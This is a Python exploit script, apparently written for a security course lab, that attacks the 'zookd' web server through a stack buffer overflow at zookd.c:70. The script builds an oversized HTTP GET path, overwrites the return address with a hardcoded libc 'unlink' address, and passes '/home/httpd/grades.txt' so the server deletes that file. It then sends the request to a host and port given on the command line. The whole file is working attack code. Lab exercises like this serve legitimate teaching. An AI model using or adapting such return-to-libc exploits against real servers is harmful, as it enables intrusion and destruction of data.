#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

def build_exploit(shellcode):
  
  # exploit stack overflow at zookd.c:70
    reqpath = "/" + "A" * (2048 + 16 + 4 - 1)  # 1 for the "/"
    stack_buffer = 0xbfffee08
    # execl_addr = 0x80489c0

    # We will use call to libc to simplify the procedure
    unlink_addr = 0x40102450

    retaddr = unlink_addr
    reqpath += struct.pack("<I", retaddr)


    reqpath += "A" * 4 # Useless return address
    arg = stack_buffer + len(reqpath) + 4

    reqpath += struct.pack("<I", arg)

    arg_string = "/home/httpd/grades.txt"
    reqpath += arg_string

    req =   "GET " + reqpath + " HTTP/1.0\r\n" + \
	    "\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())